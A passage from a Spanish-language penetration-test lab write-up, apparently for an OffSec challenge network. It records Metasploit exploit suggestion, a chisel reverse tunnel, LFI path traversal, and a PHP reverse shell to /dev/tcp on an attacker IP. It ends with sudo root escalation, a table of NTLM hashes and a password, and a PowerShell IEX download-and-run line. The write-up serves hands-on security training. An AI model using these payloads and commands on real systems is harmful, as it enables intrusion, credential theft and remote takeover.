 28364  2     [kworker/u2:1-events_power_efficient]  x86_64  root
 28365  2     [kworker/u2:0-events_unbound]          x86_64  root
 28371  2     [kworker/0:0-ata_sff]                  x86_64  root
 28424  2     [kworker/u2:2-events_unbound]          x86_64  root
```

#### Buscamos posibles exploits:

```msfconsole
meterpreter > background
[*] Backgrounding session 5...                                                                                                                                                                                    
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester                                                                                                                                        
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 5                                                                                                                                                    
SESSION => 5                                                                                                                                                                                                      
msf6 post(multi/recon/local_exploit_suggester) > options                                                                                                                                                          
                                                                                                                                                                                                                  
Module options (post/multi/recon/local_exploit_suggester):                                                                                                                                                        
                                                                                                                                                                                                                  
   Name             Current Setting  Required  Description                                                                                                                                                        
   ----             ---------------  --------  -----------                                                                                                                                                        
   SESSION          5                yes       The session to run this module on                                                                                                                                  
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits                                                                                                         
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
View the full module info with the info, or info -d command.                                                                                                                                                      
                                                                                                                                                                                                                  
msf6 post(multi/recon/local_exploit_suggester) > run                                                                                                                                                              
[*] 192.168.104.246 - Collecting local exploits for x86/linux...                                                                                                                                                  
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.                                                                                                                                                               
You can add syslog to your Gemfile or gemspec to silence this warning.                                                                                                                                            
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.                                                                                                                        
[*] 192.168.104.246 - 203 exploit checks are being tried...                                                                                                                                                       
[+] 192.168.104.246 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.15.0                                                                        
[+] 192.168.104.246 - exploit/linux/local/glibc_tunables_priv_esc: The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable                          
[+] 192.168.104.246 - exploit/linux/local/pkexec: The service is running, but could not be validated.                                                                                                             
[+] 192.168.104.246 - exploit/linux/local/su_login: The target appears to be vulnerable.                                                                                                                          
[+] 192.168.104.246 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.9.9.pre.1ubuntu2 is vulnerable, but unable to determine editable file. Please set EDITABLEFILE option manually                                                                                                                                                                                                      
[+] 192.168.104.246 - exploit/linux/local/ubuntu_needrestart_lpe: The target appears to be vulnerable. Vulnerable needrestart version 3.5.pre.5ubuntu2.1 detected on Ubuntu 22.04                                 
[*] Running check method for exploit 66 / 66                                                                                                                                                                      
[*] 192.168.104.246 - Valid modules for session 5:                                                                                                                                                                
============================                                                                                                                                                                                      
                                                                                                                                                                                                                  
 #   Name                                                               Potentially Vulnerable?  Check Result                                                                                                     
 -   ----                                                               -----------------------  ------------                                                                                                     
 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0                                          
 2   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable                                                                                                                                                                                                              
 3   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.                                                              
 4   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.                                                                             
 5   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.9.9.pre.1ubuntu2 is vulnerable, but unable to determine editable file. Please set EDITABLEFILE option manually                                                                                                                                                                         
 6   exploit/linux/local/ubuntu_needrestart_lpe                         Yes                      The target appears to be vulnerable. Vulnerable needrestart version 3.5.pre.5ubuntu2.1 detected on Ubuntu 22.04  

```

> Abrimos un channel en meterpreter y enumeramos para verificar que exploit se adapta mejor a nuestros proposito

```msfconsole
meterpreter > shell
Process 1770 created.
Channel 122 created.
whoami
anita
ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
^Z
Background channel 122? [y/N]  y
meterpreter > background
[*] Backgrounding session 1...

```

* Es posible que el exploit **exploit/linux/local/glibc_tunables_priv_esc** se ajuste nuestras necesidades, intentamos ejecutarlo:

Despues de intentar no funciono :( no luck.. 

- Levantamos un tunel en .246 para ver que podemos ver, ya que hay un servidor web en ejecucion en este host.

```bash
$ ./chisel client 192.168.45.213:9001 R:9000:127.0.0.1:8000
2025/06/13 01:42:26 client: Connecting to ws://192.168.45.213:9001
2025/06/13 01:42:28 client: Connected (Latency 208.000576ms)
```
- Servidor en kali:
```bash
┌──(root㉿kali)-[/home/kali/tools/ligolo/linux-agent]
└─# chisel server -p 9001 --reverse
2025/06/12 22:42:12 server: Reverse tunnelling enabled
2025/06/12 22:42:12 server: Fingerprint i+lBaYfvfxNFftCuW4ctsT60aZs/qF86Ig3J9EG1r/c=
2025/06/12 22:42:12 server: Listening on http://0.0.0.0:9001
2025/06/12 22:42:28 server: session#1: Client version (1.9.1) differs from server version (1.10.1-0kali1)
2025/06/12 22:42:28 server: session#1: tun: proxy#R:9000=>8000: Listening
```
- Accedemos a lo que parece ser un servidor de desarrollo interno:

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# gobuster dir -u http://127.0.0.1:9000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:9000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/backend              (Status: 301) [Size: 315] [--> http://127.0.0.1:9000/backend/]
/css                  (Status: 301) [Size: 311] [--> http://127.0.0.1:9000/css/]
/fonts                (Status: 301) [Size: 313] [--> http://127.0.0.1:9000/fonts/]
/img                  (Status: 301) [Size: 311] [--> http://127.0.0.1:9000/img/]
/index.php            (Status: 200) [Size: 4948]
/index.php            (Status: 200) [Size: 4948]
/js                   (Status: 301) [Size: 310] [--> http://127.0.0.1:9000/js/]
/server-status        (Status: 200) [Size: 23332]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```
- Probamos hacer un fuzz sobre los parametros empezando por  **backend**

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# ffuf -u 'http://127.0.0.1:9000/backend/?FUZZ=../../../../etc/passwd' -w parameters.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:9000/backend/?FUZZ=../../../../etc/passwd
 :: Wordlist         : FUZZ: /home/kali/OffSec/Challenges/2_Relia/246-machine/parameters.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

id                      [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 353ms]
file                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
page                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
post                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 352ms]
user                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
view                    [Status: 200, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
blog                    [Status: 302, Size: 757, Words: 164, Lines: 35, Duration: 354ms]
:: Progress: [7/7] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
> Parece que el parametro view responde con status **200**

#### Explicacion del posible vector

> Este vector de ataque implica movimiento lateral con el usuario www-data

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../../etc/passwd'      
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
anita:x:1001:1001:Anita:/home/anita:/bin/sh
...

```

- Confirmamos lectura de archivos:
```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# curl "http://127.0.0.1:9000/backend/?view=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
...
127.0.0.1 localhost
127.0.1.1 demo

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
...

```
#### Este comando comprueba... ?
```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../proc/self/status' | grep -i uid
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2139  100  2139    0     0   5779      0 --:--:-- --:--:-- --:--:--  5781
Uid:    33      33      33      33

```
#### Otro comando a entender

```
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../../etc/apache2/sites-enabled/000-default.conf'


<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```
- Podemos buscar archivos manualmente que sean modificables:
```bash
/backend/?view=../../../../../../../../tmp/
/backend/?view=../../../../../../../../var/tmp/
/backend/?view=../../../../../../../../dev/shm/
/backend/?view=../../../../../../../../var/www/html/uploads/
/backend/?view=../../../../../../../../home/anita/
/backend/?view=../../../../../../../../home/offsec/
```
Tenemos confirmado un LFI (Local File Inclusion) accesible desde el backend web, que corre bajo el usuario www-data.
La clave en este vector es identificar un punto de convergencia entre lo que el usuario anita (shell actual) puede escribir, y lo que el proceso web (Apache2, corriendo como www-data) puede leer.
Esto habilita técnicas como file injection o code inclusion, si el contenido escrito por anita es luego leído o interpretado por el servidor web.
De los procesos observados, Apache2 está lanzado como root, pero sus workers corren como www-data. Esto es normal y no representa una vulnerabilidad directa, pero significa que archivos leídos desde el LFI se ejecutan o muestran con ese contexto.
Como prueba de concepto (PoC):

    Es escribible por anita.

    Es legible por www-data (via LFI).

En contraste, /tmp fue escribible por anita pero no legible por www-data en este entorno, posiblemente por restricciones de montaje (como privateTmp o noexec).
- Necesitamos enumerar directorios escribibles por anita:
```bash
$ find / -writable -user anita 2>/dev/null
/tmp
... todos los proc
/home/anita
/home/anita/.bash_logout
/home/anita/.profile
/home/anita/.ssh
/home/anita/.ssh/authorized_keys
/home/anita/.bash_history
/home/anita/.cache
/home/anita/.cache/motd.legal-displayed
/home/anita/.bashrc
/home/anita/chisel
/dev/shm
/dev/pts/1
/dev/pts/0
```
- Filtramos por directorios en memoria compartida:
```bash
$ mount | grep tmpfs
udev on /dev type devtmpfs (rw,nosuid,relatime,size=954892k,nr_inodes=238723,mode=755,inode64)
tmpfs on /run type tmpfs (rw,nosuid,nodev,noexec,relatime,size=202340k,mode=755,inode64)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)
tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,nodev,noexec,relatime,size=202340k,mode=755,inode64)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=202336k,nr_inodes=50584,mode=700,uid=1001,gid=1001,inode64)
$ 
```

- La idea es probar con LFI que es legible por www-data
```bash
$ echo "POC_TMP" > /tmp/poc.txt
$ cat /tmp/poc.txt
POC_TMP
$ echo "POC_DEV_SHM" > /dev/shm/poc.txt    
$ cat /dev/shm/poc.txt
POC_DEV_SHM
```

- Desde kali:
1. Descartamos /tem

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../tem/poc.txt'    

<!DOCTYPE html>
<html >
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Backend</title>

  <link rel="stylesheet" href="../css/bootstrap.min.css" />
  <style>
    .panel-default {
        opacity: 0.9;
        margin-top:30px;
    }
    .form-group.last {
        margin-bottom:0px;
    }
    </style>
    <script src="/js/backend.js"></script>
</head>
<body>
  <div class="container">
    <div class="row">
        <div class="col-md-4 col-md-offset-7">
            <div class="panel panel-default">

            <div class="panel-footer">Not Registered? <a href="#" class="">Register here</a>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

```
2. Confirmamos **/dev/shm**
```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# curl 'http://127.0.0.1:9000/backend/?view=../../../../../../../../dev/shm/poc.txt'

<!DOCTYPE html>
<html >
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Backend</title>

  <link rel="stylesheet" href="../css/bootstrap.min.css" />
  <style>
    .panel-default {
        opacity: 0.9;
        margin-top:30px;
    }
    .form-group.last {
        margin-bottom:0px;
    }
    </style>
    <script src="/js/backend.js"></script>
</head>
<body>
  <div class="container">
    <div class="row">
        <div class="col-md-4 col-md-offset-7">
            <div class="panel panel-default">

POC_DEV_SHM
            <div class="panel-footer">Not Registered? <a href="#" class="">Register here</a>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
```

### Procedemos a escribir un shell en /dev/shm desde anita:

1. Escribimos el shell:

```bash
$ echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/192.168.45.213/4444 0>&1'\"); ?>" > /dev/shm/rce.php
```
2. Ejecutamos el receptor nc:
```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# nc -lvnp 4444
listening on [any] 4444 ...
...
```
3. Ejecutamos el shell por LFI
```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/2_Relia/246-machine]
└─# curl "http://127.0.0.1:9000/backend/?view=../../../../../../../../dev/shm/rce.php"
```
4. Recibimos el shell:
```bash
connect to [192.168.45.213] from (UNKNOWN) [192.168.104.246] 49600
bash: cannot set terminal process group (863): Inappropriate ioctl for device
bash: no job control in this shell
www-data@demo:/var/www/internal/backend$ whoami
whoami
www-data
www-data@demo:/var/www/internal/backend$ 
```
#### Buscamos escalar privilegios:
```bash
www-data@demo:/var/www/internal/backend$ find / -perm -4000 -type f 2>/dev/null
<nal/backend$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/sudo                                                                                               
/usr/libexec/polkit-agent-helper-1                                                                          
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                 
/usr/lib/openssh/ssh-keysign                                                                                
/usr/lib/snapd/snap-confine                                                                                 
/snap/core20/1695/usr/bin/chfn                                                                              
/snap/core20/1695/usr/bin/chsh                                                                              
/snap/core20/1695/usr/bin/gpasswd                                                                           
/snap/core20/1695/usr/bin/mount                                                                             
/snap/core20/1695/usr/bin/newgrp                                                                            
/snap/core20/1695/usr/bin/passwd                                                                            
/snap/core20/1695/usr/bin/su                                                                                
/snap/core20/1695/usr/bin/sudo                                                                              
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
/snap/core20/1623/usr/bin/chfn
/snap/core20/1623/usr/bin/chsh
/snap/core20/1623/usr/bin/gpasswd
/snap/core20/1623/usr/bin/mount
/snap/core20/1623/usr/bin/newgrp
/snap/core20/1623/usr/bin/passwd
/snap/core20/1623/usr/bin/su
/snap/core20/1623/usr/bin/sudo
/snap/core20/1623/usr/bin/umount
/snap/core20/1623/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1623/usr/lib/openssh/ssh-keysign
/snap/snapd/17336/usr/lib/snapd/snap-confine
/snap/snapd/17029/usr/lib/snapd/snap-confine
www-data@demo:/var/www/internal/backend$ ls -la /etc/passwd
ls -la /etc/passwd
-rw-r--r-- 1 root root 1806 Oct 12  2022 /etc/passwd
www-data@demo:/var/www/internal/backend$ sudo -l
sudo -l
Matching Defaults entries for www-data on demo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on demo:
    (ALL) NOPASSWD: ALL
www-data@demo:/var/www/internal/backend$ sudo su
sudo su
whoami
root
cd /root
ls
proof.txt
snap
cat proof.txt
a4aaa27336459a518f3c2a5285ce1b9a

```
### Tabla de credenciales

| hostname | user | NTLM | password | 
|----------|------|------|----------|
|**LEGACY**| Administrator | 387aef0561b65e4f3cae0960b0fba2d5 | [x] |
|          | adrian | e3cea06e2de8d54d43b84d4b5bffb5b0 | [x] |
|          | damon | 820d6348890893116880101307197052 | [x] |
| **WEB01/DEMO**| anita | [x] | fireball |

### Tabla de flags

| **hostname** | local | proof |
|--------------|-------|-------|
| **LEGACY**   | 6de2be6545730d15382906e9f34e3db8 | bda74c52627c3c64c3f59514ca124ed7 |
| **WEB01**    | c784533ef1e4c4f51b572cfeb22c9709 | 1e0dc9497b51bcc3f37a7dd885264cdc |
| **DEMO**     | 306c7aaf53142804b30c14605b63e057 | a4aaa27336459a518f3c2a5285ce1b9a |

## Troubleshooting
1. Tener el handler ya configurado y ejecutado a la hora de ejecutar el comando:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.239:8000/meterpreter.ps1')
```

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

